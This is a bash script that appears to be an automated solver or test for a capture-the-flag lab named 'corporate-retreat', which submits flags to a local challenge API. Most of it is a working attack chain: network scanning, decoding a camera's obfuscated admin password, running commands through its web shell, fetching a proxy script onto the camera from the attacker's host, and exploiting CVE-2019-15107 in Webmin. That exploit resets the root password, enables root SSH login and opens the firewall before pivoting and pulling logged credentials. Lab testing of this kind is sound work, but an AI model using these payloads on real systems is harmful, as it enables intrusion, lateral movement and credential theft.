#!/bin/bash

submit_flag() {
    local challenge_id="corporate-retreat"
    local task_id=$1
    local flag=$2

    RES=$(curl -s 'http://172.20.0.3/api/challenges/submit' \
        -X POST \
        -H 'Content-Type: application/json' \
        --data-binary '{"challenge_id": "'"$challenge_id"'", "task_id": "'"$task_id"'", "flag": "'"$flag"'"}')

    if [[ $RES != *"Congratulations"* ]]; then
        echo "Failed to submit flag for $task_id - $RES"
        exit 2
    fi
    echo "Flag submitted for $task_id"
}

# hardcoding hostname here to allow parallel execution with other tests
camera_ip=$(nmap -sT -p 80 172.20.0.224/27 -oG - | grep "Host:" | grep "Ports: 80/open" | grep "camera" | awk '{print $2}')
submit_flag "lil-brother" "$camera_ip"

# extract and decode admin password from admin.js
obfuscated=$(curl -s "http://$camera_ip/admin.js" | grep -A1 'atob' | grep -v atob | cut -d '"' -f 2)
admin_password=$(echo "$obfuscated" | rev | base64 -d | base64 -d | rev | base64 -d)

run_on_camera() {
  curl -s -XPOST "http://$camera_ip/shell" -H "Cookie: credentials=admin:$admin_password" -d "$1"
}
run_on_camera "sudo apk add nmap python3" >/dev/null

camera_internal_ip=$(run_on_camera "ifconfig" | grep -e "inet addr:" | grep -v -e "172.20.0.231" -e "127.0.0.1" | awk -F 'inet addr:| B' '{print $2}' | xargs)
camera_router_ip=$(run_on_camera "sudo nmap -sT $camera_internal_ip/24" | grep router | awk -F '[()]' '{print $2}' | xargs)

# upload proxy script to camera
python3 -mhttp.server 8000 -d /root/ &
httpd_pid=$!
hackerlab_ip=$(ifconfig | grep -e "inet" | grep -v "127.0.0.1" | awk -F 'inet | n' '{print $2}' | xargs)
run_on_camera "wget -q -O /tmp/proxy.py http://$hackerlab_ip:8000/proxy.py"
kill $httpd_pid

# run proxy on camera for direct access to router, make sure it spins up
run_on_camera "python3 /tmp/proxy.py $camera_router_ip 10000" &
sleep 3

# CVE-2019-15107 webmin password reset
curl -s "https://$camera_ip:8080/password_change.cgi" -d 'user=wheel&pam=&expired=2&old=echo "root:toor"|chpasswd|echo done&new1=wheel&new2=wheel' -k -H "Referer: https://$camera_ip:8080" >/dev/null

router_sid=$(curl -k -s -XPOST "https://$camera_ip:8080/session_login.cgi" -d 'user=root&pass=toor' -v -H 'cookie: testing=1' 2>&1 | grep 'sid=' | awk -F '=|;' '{print $2}')
run_on_router() {
  cmd_out=$(curl -k -s -XPOST "https://$camera_ip:8080/shell/index.cgi?stripped=1&stripped=2" -H "cookie: sid=$router_sid" -H "Referer: https://$camera_ip:8080" -F cmd="$1")
  echo "$cmd_out" | awk '/<[/]b>/{f=1;next} /<[/]pre>/{f=0} f'
}

# extract flag 2
poem=$(run_on_router "cat /app/poem.txt" | grep -Po 'M1r0{.*}')
submit_flag "edgar-allan-route" "$poem"

# move further - find the other webmin - optimized to only match the search-worthy part of the subnet
big_subnet=$(run_on_router "ip a" | awk -F 'inet | brd' '{print $2}' | grep '/16' | sed 's/16/21/')
other_router_ip=$(run_on_router "nmap -sT $big_subnet -p 10000" | grep open -B4 | grep '[[:digit:]]\.[[:digit:]]\.[[:digit:]]' | grep -v 10.0.0.3 |  awk -F '[()]' '{print $2}')

# exploit CVE-2019-15107 again, allow external ssh
run_on_router "curl https://$other_router_ip:10000/password_change.cgi -d 'user=wheel&pam=&expired=2&old=echo%20%22root%3Atoor%22%7Cchpasswd%26%26sed%20-i%20-e%20%22%2F.*PermitRootLogin.*%2Fd%22%20-e%20%22%5C%24a%20PermitRootLogin%20yes%22%20%2Fetc%2Fssh%2Fsshd_config%26%26iptables%20-I%20INPUT%20-j%20ACCEPT%26%26service%20ssh%20restart%26%26echo%20ok&new1=wheel&new2=wheel' -k -H 'Referer: https://$other_router_ip:10000'" >/dev/null

# 172.20.0.239 is BigComp, as we know - ssh into the other router, find the internal ip of the 'attacker' connecting to 172.20.0.200
run_on_other_router() {
  sshpass -p "toor" ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@172.20.0.239 "$1"
}
attacker_internal_ip=$(run_on_other_router "cat /var/log/ulog/syslogemu.log | grep 172.20.0.200" | awk -F 'SRC=| DST' '{print $2}')
submit_flag "you-know-where-from" "$attacker_internal_ip"

employee_system_ip=$(run_on_other_router "nmap -sT $big_subnet -p 8000" | grep open -B4 | grep '[[:digit:]]\.[[:digit:]]\.[[:digit:]]' |  awk -F '[()]' '{print $2}')
# skipping employee search, just validating that the link is there
run_on_other_router "curl -s http://$employee_system_ip:8000" | grep "?page=88811" >/dev/null
if [ $? -ne 0 ]; then
  echo "Employee link not present"
  exit 1
fi

# next flag - address
attacker_detail=$(run_on_other_router "curl -s http://$employee_system_ip:8000?page=88811")
attacker_address=$(echo "$attacker_detail" | grep 'havn' | awk -F 'Langelinie|,' '{print $2}')
attacker_address="Langelinie$attacker_address"
submit_flag "s-he-who-must-be-located" "$attacker_address"

# other ip - actually not necessary for solving, but mentioned in the readme
#attacker_other_ip=$(echo "$attacker_detail" | grep -Po '[[:digit:]]+\.[[:digit:]]+\.[[:digit:]]+\.[[:digit:]]+' | grep -v '10.0.1.233')

# check that iptables actually mentions the proxy
run_on_other_router "iptables -L 2>/dev/null | grep locproxy" >/dev/null
if [ $? -ne 0 ]; then
  echo "proxy entry in iptables not present"
  exit 1
fi

# since the hostname is already used/shown in the iptables entry, might as well use it rather than the ip address
proxy_entry=$(run_on_other_router "ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@locproxy cat /var/log/proxy/web-proxy-2025-01-05.log")

# forum flag
domain=$(echo "$proxy_entry" | awk -F 'www\\.' '{print $2}' | awk -F'[;,]' '{print $1}')
submit_flag "baked-goods-and-other-interests" "$domain"

# credentials flag
username=$(echo "$proxy_entry" | awk -F 'username=' '{print $2}' | awk -F '&' '{print $1}')
password=$(echo "$proxy_entry" | awk -F 'password=' '{print $2}' | awk -F '&' '{print $1}' | sed 's/%7B/{/' | sed 's/%7D/}/')
submit_flag "huh-a-forum" "$username:$password"

killall curl
echo "OK - tests passed"
